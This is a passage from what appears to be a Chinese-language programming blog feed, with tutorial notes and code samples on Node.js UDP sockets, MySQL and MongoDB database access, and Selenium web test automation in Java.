class="code"><pre><span class="line">const dgram = require(&#x27;dgram&#x27;);</span><br><span class="line">const socket = dgram.createSocket(&#x27;udp4&#x27;)</span><br><span class="line"></span><br><span class="line">//设定字节传输内容</span><br><span class="line">let message = new Buffer(&#x27;hello udp&#x27;)</span><br><span class="line">socket.send(message,0,message.length,41234,&#x27;localhost&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-数据库开发"><a href="#4-数据库开发" class="headerlink" title="4.数据库开发"></a>4.数据库开发</h2><h3 id="4-1-mysql"><a href="#4-1-mysql" class="headerlink" title="4.1 mysql"></a>4.1 mysql</h3><p>mysql是经典的关系型数据库，node.js 提供了操作它的模块</p><p>首先使用<code>npm install mysql</code></p><p>然后使用createConnection创建链接，传入基本配置对象，有host user password &amp; database（需要链接的数据库名称）</p><p>然后是connect函数判断链接是否成功，成功可以得到一个链接线程id</p><p>我们还可以终止链接：</p><p>使用connection.end方法（可以正常终止一个链接）</p><p>使用connection.destory方法（立即终止链接，直接终结底层套接字）-不推荐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const mysql = require(&#x27;mysql&#x27;);</span><br><span class="line"></span><br><span class="line">//创建链接</span><br><span class="line">const connection = mysql.createConnection(&#123;</span><br><span class="line">    //传入链接对象</span><br><span class="line">    host: &#x27;localhost&#x27;,</span><br><span class="line">    user: &#x27;root&#x27;,</span><br><span class="line">    password: &#x27;ztdgz947&#x27;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//链接mysql-connect函数</span><br><span class="line">connection.connect(function (err) &#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        console.log(err.stack)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    console.log(&quot;connected as id&quot; + connection.threadId);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>对于数据库最主要的查询功能，使用query函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//查询数据</span><br><span class="line">connection.query(&#x27;select * from student&#x27;,function (err, rows) &#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        console.log(err);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        console.log(rows);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>为了防止sql注入，我们使用<code>connection.escape()</code>包裹需要拼接的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let sql = &#x27;select * from user where userid=&#x27; + connection.escape(userid)</span><br></pre></td></tr></table></figure><p>然后就可以将sql作为query函数的第一个参数</p><h3 id="4-2MongoDB"><a href="#4-2MongoDB" class="headerlink" title="4.2MongoDB"></a>4.2MongoDB</h3><p>MongoDB则是数据库的另一种类型的代表，nosql（非关系型数据库）</p><p>MongoDB这种非关系型数据库常常用于更大数据量的开发过程，储存结构虽然不标准但是功能更强大</p><p>依然是使用connect进行连接</p><p>url方面：<code>mongodb://user:pass@localhost:port/database</code> 其中user是用户名，pass是密码，port是端口号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const mongoose = require(&#x27;mongoose&#x27;);</span><br><span class="line"></span><br><span class="line">//设计url</span><br><span class="line">const url = &#x27;mongodb://localhost/article&#x27;;</span><br><span class="line"></span><br><span class="line">//链接数据库</span><br><span class="line">mongoose.connect(url, function (err) &#123;</span><br><span class="line">    if(err) &#123;</span><br><span class="line">        console.log(&#x27;connect failed&#x27;);</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&#x27;connect success&#x27;);    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后我们可以使用model和save插入到集合中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">const mongoose = require(&#x27;mongoose&#x27;);</span><br><span class="line"></span><br><span class="line">//设计url</span><br><span class="line">const url = &#x27;mongodb://localhost/article&#x27;;</span><br><span class="line"></span><br><span class="line">//链接数据库</span><br><span class="line">mongoose.connect(url, function (err) &#123;</span><br><span class="line">    if(err) &#123;</span><br><span class="line">        console.log(&#x27;connect failed&#x27;);</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&#x27;connect success&#x27;);    </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 定义一个模块的Schema</span><br><span class="line">const ArticleSchema = new mongoose.Schema(&#123;</span><br><span class="line">    title: String,</span><br><span class="line">    author: String,</span><br><span class="line">    content: String,</span><br><span class="line">    publishTime: Date</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//使用model方法注册一个model</span><br><span class="line">mongoose.model(&#x27;Article&#x27;,ArticleSchema);</span><br><span class="line">const Article = mongoose.model(&#x27;Article&#x27;);</span><br><span class="line">let art = new Article(&#123;</span><br><span class="line">    title: &#x27;node.js&#x27;,</span><br><span class="line">    author: &#x27;node&#x27;,</span><br><span class="line">    content: &#x27;node.js is great&#x27;,</span><br><span class="line">    publishTime: new Date()</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//将这个文档插入集合中</span><br><span class="line">art.save(function (err) &#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        console.log(err);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        console.log(&#x27;save successed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>显示 save successed之后可以在MongoDB compass中查看数据库内容</p><p>查询和更改</p><p>首先<strong>查询和更改的执行顺序高于插入</strong>，每次都是在find结果出来之后才显示的save successed</p><p>如果我们查询和插入在一起执行，就会出现错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connect success</span><br><span class="line">result: </span><br><span class="line">save successed</span><br></pre></td></tr></table></figure><p>查询使用find和findOne方法，一个是返回所有数据，findOne是返回第一个查询到的数据</p><p>对于更改方法，我们发现更改之后的docs就立马发生了变化，我们可以猜想，<strong>docs设置了响应式</strong>，查询结果的数据改变那么docs也会改变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//查询模块</span><br><span class="line">//find第一个参数是查询条件，fun中的第二个参数是查询结果</span><br><span class="line">Article.find(&#123;title: &#x27;node.js&#x27;&#125;,function (err, docs) &#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        console.log(&#x27;error&#x27;);</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&quot;result: &quot; + docs);</span><br><span class="line">    //修改数据</span><br><span class="line">    docs[0].title = &#x27;javascript&#x27;;</span><br><span class="line">    docs[0].save();</span><br><span class="line">    //再一次打印结果改变，说明docs是实时更新</span><br><span class="line">    console.log(&quot;new result: &quot;+ docs);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>删除数据就使用remove，在遍历中加一个条件，实现条件过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//删除数据</span><br><span class="line">if(docs)&#123;</span><br><span class="line">    docs.forEach(ele =&gt; &#123;</span><br><span class="line">        //条件删除</span><br><span class="line">        if(ele.title == &#x27;javascript&#x27;)&#123;</span><br><span class="line">            ele.remove()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    console.log(docs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接连接MongoDB：</p><p>但是好像server模块有点问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">const mongoClient = require(&#x27;mongodb&#x27;).MongoClient;</span><br><span class="line">//Db获取数据库实例</span><br><span class="line">const Db = require(&#x27;mongodb&#x27;).Db;</span><br><span class="line">//获取服务器实例</span><br><span class="line">const server = require(&#x27;mongodb&#x27;).server;</span><br><span class="line">//新建数据库</span><br><span class="line">const studentDb = new Db(&#x27;student&#x27;, new server(&#x27;localhost&#x27;, &#x27;27017&#x27;));</span><br><span class="line"></span><br><span class="line">let student = &#123;</span><br><span class="line">    id: &#x27;1101&#x27;,</span><br><span class="line">    name: &#x27;jack&#x27;,</span><br><span class="line">    age: 12</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//打开数据库</span><br><span class="line">studentDb.open(function (err, db) &#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        console.log(err);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //打开集合</span><br><span class="line">    db.collection(&#x27;student&#x27;, function (err, collection) &#123;</span><br><span class="line">        if(err)&#123;</span><br><span class="line">            console.log(err);</span><br><span class="line">            studentDb.close();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        //插入文档doc</span><br><span class="line">        collection.insertOne(student, function (err, doc) &#123;</span><br><span class="line">            //关闭数据库</span><br><span class="line">            studentDb.close();</span><br><span class="line">            if(err)&#123;</span><br><span class="line">                console.log(err);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            console.log(doc[0]);</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">//连接mongodb</span><br><span class="line">// mongoClient.connect(url, function (err, db) &#123;</span><br><span class="line">//     if(err)&#123;</span><br><span class="line">//         console.log(err);</span><br><span class="line">//         return;</span><br><span class="line">//     &#125;</span><br><span class="line">//     console.log(&quot;connect success&quot;);</span><br><span class="line">// &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>selenium</title>
    <link href="/2022/10/18/selenium/"/>
    <url>/2022/10/18/selenium/</url>
    
    <content type="html"><![CDATA[<h1 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h1><p>selenium用于进行我们的性能测试和功能测试，常用与web端和应用端</p><h2 id="1-eclipse-配置"><a href="#1-eclipse-配置" class="headerlink" title="1.eclipse 配置"></a>1.eclipse 配置</h2><p>首先，配置maven，然后创建一个maven项目</p><p>使用new project，然后搜索maven创建新的maven项目</p><p>group Id：是公司名称，使用com.xxx即可</p><p>artifact Id：包名称，也就是我们的项目名称</p><p>packaging：打包方式 有jar war等等</p><p><img src="https://img-blog.csdnimg.cn/957963d514bf420cb341fc13ffa8ed11.png" alt="新建maven项目"></p><p>创建之后得到我们常见的项目目录，有开发人员的main和测试人员的test</p><p>然后我们打开pom.xml</p><p>应用selenium的dependence</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;dependencies&gt;</span><br><span class="line">  &lt;!-- selenium --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.seleniumhq.selenium&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;selenium-java&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.141.59&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt; </span><br></pre></td></tr></table></figure><p>然后在test/java中需要写，这样我们就能操作Chrome打开百度网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">import org.openqa.selenium.chrome.ChromeDriver;</span><br><span class="line"></span><br><span class="line">public class firstWebTest &#123;</span><br><span class="line">public static void main(String arg[]) &#123;</span><br><span class="line">//使用浏览器driver</span><br><span class="line">ChromeDriver chromeriver = new ChromeDriver();</span><br><span class="line">//访问百度</span><br><span class="line">chromeriver.get(&quot;https://www.baidu.com&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-基本元素定位"><a href="#2-基本元素定位" class="headerlink" title="2.基本元素定位"></a>2.基本元素定位</h2><p>根据元素id进行定位，如果定位对象是一个input框，可以使用sendKeys填入数据，如果定位对象是一个按钮的话，就可以使用<code>.click</code>方法触发点击事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class firstWebTest &#123;</span><br><span class="line">//设置全局变量</span><br><span class="line">public static ChromeDriver chromeDriver;</span><br><span class="line">public static void main(String arg[]) &#123;</span><br><span class="line">openChrome();</span><br><span class="line">//定位到百度输入框并输入数据</span><br><span class="line">chromeDriver.findElement(By.id(&quot;kw&quot;)).sendKeys(&quot;腾讯课堂&quot;);</span><br><span class="line">//定位到点击一下按钮</span><br><span class="line">chromeDriver.findElement(By.id(&quot;su&quot;)).click();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static void openChrome() &#123;</span><br><span class="line">//使用浏览器driver</span><br><span class="line">chromeDriver = new ChromeDriver();</span><br><span class="line">//访问百度</span><br><span class="line">chromeDriver.get(&quot;https://www.baidu.com&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更改By.xxx 的内容进行更改，如改为By.name</p><p>还可以使用tagName去定位，tagName是什么呢？简单来说 html5标签</p><p>还有根据className（class）和linkText（超链接文本值定位）partiaLinxText（部分超链接文本定位）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用linkTest点击超链接</span><br><span class="line">chromeDriver.findElement(By.partialLinkText(&quot;百度首页&quot;)).click();</span><br></pre></td></tr></table></figure><p>这样我们就可以又回到百度首页</p><h2 id="3-特殊定位"><a href="#3-特殊定位" class="headerlink" title="3.特殊定位"></a>3.特殊定位</h2><h3 id="1-css定位"><a href="#1-css定位" class="headerlink" title="1.css定位"></a>1.css定位</h3><p>根据id定位需要加#</p><p>根据class定位需要加.  如果是复合类名就需要在两个类名之间中.做分割</p><p><img src="https://img-blog.csdnimg.cn/ea0618cd28dc4d9292bb77be3d66cef0.png" alt="css定位"></p><p>我们还有更精确的定位方式，<strong>我们在f12中使用Ctrl+F打开搜索功能</strong>，然后按照  <code>标签名[key=&quot;value&quot;]</code>的形式查找唯一符合标准的元素</p><p>然后到selenium中使用cssSelector操作</p><p><img src="https://img-blog.csdnimg.cn/5a6a2280407a45b3969da5f7e7c23058.png" alt="精确定位"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用精确定位</span><br><span class="line">chromeDriver.findElement(By.cssSelector(&quot;a[class=&#x27;&#x27;]&quot;)).click();</span><br></pre></td></tr></table></figure><h3 id="2-Xpath定位"><a href="#2-Xpath定位" class="headerlink" title="2.Xpath定位"></a>2.Xpath定位</h3><p>这种定位有绝对路径和相对路径两种</p><p>绝对路径的耦合性较大：</p><p>需要从/html/body开始一路向下找到我们所需要定位的元素</p><p>相对路径由@开头：</p><p><img src="https://img-blog.csdnimg.cn/0f648cedbc1246b3a79323fcb1b27cc4.png" alt="Xpath相对路径定位"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chromeDriver.findElement(By.xpath(&quot;//a[@class=&#x27;&#x27;][@tabindex=&#x27;0&#x27;]&quot;)).click();</span><br></pre></td></tr></table></figure><p>这里还可以根据文本定位，使用：text()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chromeDriver.findElement(By.xpath(&quot;//a[text()=&#x27;官方&#x27;]&quot;)).click();</span><br></pre></td></tr></table></figure><h2 id="4-元素操作"><a href="#4-元素操作" class="headerlink" title="4.元素操作"></a>4.元素操作</h2><p>一些常用的元素操作有：</p><p>click()：执行点击操作</p><p>clear()：执行清空处理</p><table><thead><tr><th>更多操作方法</th><th>描述</th></tr></thead><tbody><tr><td>click(on_element=None)</td><td>单击鼠标左键</td></tr><tr><td>click_and_hold(on_element=None)</td><td>单击鼠标左键,不松开</td></tr><tr><td>context_click(on_element=None)</td><td>单击鼠标右键</td></tr><tr><td>double_click(on_element=None)</td><td>双击鼠标左键</td></tr><tr><td>drag_and_drop(soure, target)</td><td>拖动到某个元素然后松开</td></tr><tr><td>drag_and_drop_by_offset(soure,xoffset, yoffset)</td><td>拖动到某个坐标然后松开</td></tr><tr><td>key_down(value, element=None)</td><td>按下某个键盘上的键</td></tr><tr><td>key_up(value, element=None)</td><td>松开某个键</td></tr><tr><td>move_by_offset(xoffset, yoffset)</td><td>鼠标指针从当前位置移动到某个坐标</td></tr><tr><td>move_to_element(to_element)</td><td>鼠标指针移动到某个元素</td></tr><tr><td>move_to_element_with_offset(to_element,xoffset,yoffset)</td><td>移动到距某个元素（左上角坐标）多少距离的位置</td></tr><tr><td>perform()</td><td>执行链中的所有动作</td></tr><tr><td>release(on_element=None)</td><td>在某个元素位置松开鼠标左键</td></tr><tr><td>send_keys(keys_to_send)</td><td>发送某个键到当前焦点的元素</td></tr><tr><td>send_keys_to_element(element, keys_to_send)</td><td>发生某个键到指定的元素</td></tr></tbody></table><p>键盘事件：</p><p><img src="https://img-blog.csdnimg.cn/5de3d351654c441e95e48050ed2031ec.png" alt="键盘事件"></p><p>时间等待：sleep</p><p>sleep需要使用try catch包裹起来，使用Thread.sleep()实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">driver.get(&quot;https://music.91q.com/&quot;);</span><br><span class="line">driver.findElement(By.linkText(&quot;歌单&quot;)).click();</span><br><span class="line">Thread.sleep(1000);</span><br><span class="line">driver.findElement(By.xpath(&quot;//span[@title=\&quot;电子\&quot;]&quot;)).click();</span><br><span class="line">Thread.sleep(1000);</span><br><span class="line">driver.findElement(By.xpath(&quot;//img[@src=\&quot;https://img01.dmhmusic.com/0105/M00/E9/A4/ChR45GKy4m2AGwKiAAuLrKC1ZgU349.jpg@w_300,h_300\&quot;]&quot;)).click();</span><br><span class="line">Thread.sleep(1000);</span><br><span class="line">&#125;catch(Exception e)&#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>页面API：</p><p><img src="https://img-blog.csdnimg.cn/0ae37f230d454c48bf694265e0d05f49.png" alt="页面API"></p><p>一般测试结束后都会调用quit函数，关闭浏览器</p><p>操作实例</p><p>这里的回退操作我本来想用<code>back()</code>的</p><p>但是这里调用back会回到<code>data;</code>（因为没有点击click开启搜索，所以还是在第一个页面），所以就先使用to调转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">openChrome();</span><br><span class="line">chromeDriver.findElement(By.id(&quot;kw&quot;)).sendKeys(&quot;swpu&quot;);</span><br><span class="line">//睡眠三秒</span><br><span class="line">Thread.sleep(3000);</span><br><span class="line">//清空内容</span><br><span class="line">chromeDriver.findElement(By.id(&quot;kw&quot;)).clear();</span><br><span class="line">//获取元素属性</span><br><span class="line">WebElement webElement1 = chromeDriver.findElement(By.id(&quot;kw&quot;));</span><br><span class="line">//输出标签名</span><br><span class="line">System.out.print(webElement1.getTagName());</span><br><span class="line">//回退</span><br><span class="line">chromeDriver.navigate().to(&quot;https://www.baidu.com&quot;);</span><br><span class="line">//输出文本值</span><br><span class="line">WebElement webElement2 = chromeDriver.findElement(By.xpath(&quot;//a[text()=\&quot;hao123\&quot;]&quot;));</span><br><span class="line">System.out.print(webElement2.getText());</span><br><span class="line">//检查元素是否显示</span><br><span class="line">System.out.print(webElement2.isDisplayed());</span><br></pre></td></tr></table></figure><p>这里面driver的操作还有</p><p>close(),</p><p>quit()【一般放程序结束的地方】</p><p>获取句柄（句柄（Handle）是一个是用来标识对象或者项目的<em><strong>标识符</strong></em>，可以用来<em>描述窗体、文件</em>等）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">openChrome();</span><br><span class="line">//定位到百度输入框并输入数据</span><br><span class="line">chromeDriver.findElement(By.id(&quot;kw&quot;)).sendKeys(&quot;腾讯课堂&quot;);</span><br><span class="line">//定位到点击一下按钮</span><br><span class="line">chromeDriver.findElement(By.id(&quot;su&quot;)).click();</span><br><span class="line">//获取当前句柄</span><br><span class="line">chromeDriver.getWindowHandle();</span><br><span class="line">//获取全部句柄</span><br><span class="line">chromeDriver.getWindowHandles();</span><br><span class="line">Thread.sleep(3000);</span><br><span class="line">//跳转页面</span><br><span class="line">chromeDriver.findElement(By.name(&quot;label&quot;)).click();</span><br><span class="line">//对比全部句柄</span><br><span class="line">chromeDriver.getWindowHandles();</span><br></pre></td></tr></table></figure><p>还可以获取浏览器操作，使用manage，得到options对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options option = chromeDriver.manage();</span><br><span class="line">option.xxx</span><br></pre></td></tr></table></figure><p>其中有很多方法给我们使用，比如window进行页面参数的获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Options option = chromeDriver.manage();</span><br><span class="line">//获取当前页面大小</span><br><span class="line">System.out.print(option.window().getSize());</span><br></pre></td></tr></table></figure><p>然后是我们操作浏览器路由的navigate</p><p><img src="https://img-blog.csdnimg.cn/382b2f29268a488886b90e49f6aeca74.png" alt="navigate对象"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//获取navigate对象</span><br><span class="line">Navigation navigate = chromeDriver.navigate();</span><br><span class="line">navigate.to(&quot;https://www.jd.com&quot;);</span><br><span class="line">navigate.refresh();</span><br><span class="line">navigate.back();</span><br></pre></td></tr></table></figure><h2 id="5-三大等待"><a href="#5-三大等待" class="headerlink" title="5.三大等待"></a>5.三大等待</h2><h3 id="5-1硬性等待"><a href="#5-1硬性等待" class="headerlink" title="5.1硬性等待"></a>5.1硬性等待</h3><p>使用线程Thread.sleep()</p><p>需要抛出错误，实现等待</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">driver.get(&quot;https://music.91q.com/&quot;);</span><br><span class="line">driver.findElement(By.linkText(&quot;歌单&quot;)).click();</span><br><span class="line">Thread.sleep(1000);</span><br><span class="line">driver.findElement(By.xpath(&quot;//span[@title=\&quot;电子\&quot;]&quot;)).click();</span><br><span class="line">Thread.sleep(1000);</span><br><span class="line">driver.findElement(By.xpath(&quot;//img[@src=\&quot;https://img01.dmhmusic.com/0105/M00/E9/A4/ChR45GKy4m2AGwKiAAuLrKC1ZgU349.jpg@w_300,h_300\&quot;]&quot;)).click();</span><br><span class="line">Thread.sleep(1000);</span><br><span class="line">&#125;catch(Exception e)&#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2隐式等待"><a href="#5-2隐式等待" class="headerlink" title="5.2隐式等待"></a>5.2隐式等待</h3><p>隐式等待使用的是全局配置，设置之后只要后面需要寻找元素就会触发</p><p>他在driver的manage方法下，第一个参数是num数字，第二个类型是时间单位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//实现隐式等待 等待五秒</span><br><span class="line">chromeDriver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);</span><br></pre></td></tr></table></figure><h3 id="5-3显示等待"><a href="#5-3显示等待" class="headerlink" title="5.3显示等待"></a>5.3显示等待</h3><p>等待某个元素显示之后在执行操作</p><p><img src="https://img-blog.csdnimg.cn/a443fa4245484255ac588f4c5721a057.png" alt="显示等待"></p><p>我们需要新构造一个WebDriverWait对象并传入driver和时间参数</p><figure class="highlight plaintext"><table><tr><td 